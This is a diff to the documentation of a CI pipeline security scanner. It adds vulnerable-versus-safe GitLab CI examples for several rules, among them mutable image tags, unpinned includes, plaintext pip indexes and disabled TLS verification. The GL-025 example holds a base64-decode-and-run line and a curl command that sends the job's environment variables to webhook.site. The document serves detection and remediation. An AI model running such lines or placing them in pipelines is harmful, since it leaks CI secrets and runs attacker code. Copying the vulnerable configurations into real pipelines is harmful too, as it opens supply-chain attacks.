@@ -3552,6 +3552,27 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: node:20`` is a mutable tag. Docker
+# Hub's node team rebuilds it on every Node point
+# release; a publisher takeover ships code into every
+# GitLab pipeline using the tag.
+build:
+  image: node:20
+  script:
+    - npm ci
+    - npm test
+
+# Safe: pin to the content-addressable digest.
+build:
+  image: node@sha256:abc123...   # node:20.11.1
+  script:
+    - npm ci
+    - npm test
+```
+
 **Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }
@@ -3571,6 +3592,29 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.
 
 **Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``include:`` pulls a remote project without
+# a pinned ref. ``ref:`` defaults to ``HEAD`` of the
+# default branch; whoever can push to that branch on
+# the templates project ships pipeline code into every
+# consumer.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    # no ref: — resolves to HEAD
+
+# Safe: pin ``ref:`` to a tag (with tag-protect enforced
+# on the templates project) or a 40-char commit SHA.
+# Renovate's gitlabci-include ecosystem updater bumps
+# these in reviewable MRs.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+```
 
 **Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -3613,6 +3657,26 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url http://internal-pypi.example.com/simple
+        --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA
+# installed into the image's trust store.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url https://internal-pypi.example.com/simple
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -3664,6 +3728,30 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` /
+# ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables TLS for
+# the rest of the job. A MITM swaps the registry's
+# tarballs in flight.
+install:
+  image: node@sha256:abc123...
+  script:
+    - npm config set strict-ssl false
+    - npm install
+
+# Safe: install the missing CA into the image trust
+# store; keep strict-ssl on.
+install:
+  image: node@sha256:abc123...
+  script:
+    - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+    - update-ca-certificates
+    - npm install
+```
+
 **Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }
@@ -3689,6 +3777,25 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a job body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious MR (or a compromised co-
+# maintainer) lands the payload in the CI file; every
+# subsequent run executes it.
+build:
+  script:
+    - echo Z2g6Li4uIA== | base64 -d | sh
+    - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# If a check fires here, treat as incident response.
+build:
+  script: [make build]
+```
+
 **Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }
@@ -3709,6 +3816,29 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 
 **Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``services:`` references mutable image
+# tags. A publisher repoint (or namespace takeover) on
+# the services image swaps the code that runs alongside
+# every job using the service.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres:15
+    - redis:7
+  script: [pytest]
+
+# Safe: pin every services image to its digest.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres@sha256:def456...   # postgres:15.4
+    - redis@sha256:fed987...      # redis:7.2.4
+  script: [pytest]
+```
+
 **Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }
@@ -3728,6 +3858,32 @@ Pairs with the per-file PYPI-002 rule (lockfile hash pin presence) on the packag
 **How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.
 
 **Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``trigger:`` ``include:`` pulls a child
+# pipeline definition from a remote project without
+# pinning the ref. Whoever can push to that project's
+# default branch ships child-pipeline content into the
+# parent's run.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        # no ref:
+
+# Safe: pin ``ref:`` to a SHA or protected tag.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        ref: 0123456789abcdef0123456789abcdef01234567
+```
 
 **Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).
 
